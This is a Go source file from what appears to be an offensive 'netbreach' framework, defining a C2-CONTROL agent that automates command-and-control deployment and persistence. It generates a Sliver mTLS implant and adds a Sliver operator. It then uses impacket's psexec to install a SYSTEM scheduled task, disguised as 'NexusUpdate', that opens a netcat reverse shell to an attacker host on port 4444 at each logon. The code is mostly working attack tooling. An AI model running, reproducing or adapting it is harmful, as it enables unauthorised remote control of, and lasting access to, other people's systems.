// C2-CONTROL — Command & Control / Persistence Agent
// sliver, covenant, posh-c2, metasploit RPC

package netbreach

import (
	"fmt"
	"os/exec"
	"strings"
)

// C2ControlAgent handles C2 operations
type C2ControlAgent struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewC2ControlAgent(bus *EventBus, state *SharedState) *C2ControlAgent {
	return &C2ControlAgent{bus: bus, state: state, stopCh: make(chan struct{}), msgCh: make(chan AgentMessage, 100)}
}

func (a *C2ControlAgent) Name() string  { return "C2-CONTROL" }
func (a *C2ControlAgent) Status() string { return "online" }

func (a *C2ControlAgent) Start() {
	a.bus.Subscribe("C2-CONTROL", a.msgCh)
	for {
		select {
		case msg := <-a.msgCh:
			a.Handle(msg)
		case <-a.stopCh:
			return
		}
	}
}

func (a *C2ControlAgent) Stop() { close(a.stopCh) }

func (a *C2ControlAgent) Handle(msg AgentMessage) {
	switch msg.Type {
	case "C2_DEPLOY":
		a.deployC2(msg.Data)
	case "PERSIST":
		a.persistence(msg.Data)
	}
}

func (a *C2ControlAgent) broadcast(msg string) {
	a.bus.Broadcast(AgentMessage{From: "C2-CONTROL", To: "ALL", Type: "LOG", Data: msg})
}

func (a *C2ControlAgent) deployC2(target string) {
	a.broadcast(fmt.Sprintf("[C2] Deploying C2 on: %s", target))

	// sliver C2
	if out, err := exec.Command("sliver-server", "operators", "--add", "nexus").CombinedOutput(); err == nil {
		a.broadcast("[C2] Sliver operator added")
		_ = out
	}

	// Generate sliver implant
	if out, err := exec.Command("sliver-client", "generate", "--mtls", target,
		"--save", "/tmp/implant.exe").CombinedOutput(); err == nil {
		a.broadcast("[C2] Sliver implant generated: /tmp/implant.exe")
		_ = out
	}
}

func (a *C2ControlAgent) persistence(target string) {
	a.broadcast(fmt.Sprintf("[C2] Installing persistence on: %s", target))

	// Create scheduled task via impacket
	if out, err := exec.Command("psexec.py", target, "-c", "schtasks.exe",
		"/create", "/tn", "NexusUpdate", "/tr", "cmd.exe /c nc -e cmd.exe attacker 4444",
		"/sc", "onlogon", "/ru", "SYSTEM").CombinedOutput(); err == nil {
		a.broadcast("[C2] Scheduled task persistence installed")
		_ = out
	} else {
		if strings.Contains(string(out), "success") {
			a.broadcast("[C2] Persistence confirmed")
		}
	}
}
